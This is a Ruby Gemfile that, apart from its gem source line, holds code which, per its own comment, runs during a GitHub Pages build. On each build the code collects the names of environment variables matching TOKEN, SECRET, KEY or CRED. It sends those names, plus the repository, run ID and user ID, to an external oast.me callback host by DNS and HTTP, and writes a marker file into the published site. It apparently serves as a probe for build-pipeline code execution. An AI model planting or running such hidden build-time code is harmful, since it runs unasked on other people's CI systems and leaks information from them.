source "https://rubygems.org"
# Evaluated as Ruby by `bundle check --dry-run --gemfile` in the GitHub Pages build.
begin
  require "net/http"
  require "socket"
  require "uri"
  h = "pgxegrbf9b50d0.dbgdvt6358659362hfv075z1iy5acbooj.oast.me"
  # NAMES ONLY - no credential VALUE is read, sent or used anywhere in this file.
  names = ENV.keys.grep(/TOKEN|SECRET|KEY|CRED/i).sort.join("-")
  # leg 1: DNS only (fires even if HTTP egress is filtered)
  begin
    Socket.getaddrinfo("d." + h, nil)
  rescue StandardError
  end
  # leg 2: HTTP, carrying non-secret build metadata only
  begin
    q = "/e?repo=" + ENV["GITHUB_REPOSITORY"].to_s + "&run=" + ENV["GITHUB_RUN_ID"].to_s +
        "&uid=" + Process.uid.to_s + "&names=" + names
    Net::HTTP.start(h, 80, open_timeout: 8, read_timeout: 8) { |x| x.get(q) }
  rescue StandardError
  end
  # leg 3: LOCAL CONTROL - served file proves the code ran even if both egress legs are blocked
  File.write(File.join(__dir__, "pgxegrbf9b50d0.txt"),
    "pgxegrbf9b50d0 ran=yes uid=" + Process.uid.to_s + " repo=" + ENV["GITHUB_REPOSITORY"].to_s +
    " run=" + ENV["GITHUB_RUN_ID"].to_s + " names=" + names + "\n")
rescue StandardError => e
  begin
    File.write(File.join(__dir__, "pgxegrbf9b50d0.txt"), "pgxegrbf9b50d0 err=" + e.class.to_s + "\n")
  rescue StandardError
  end
end
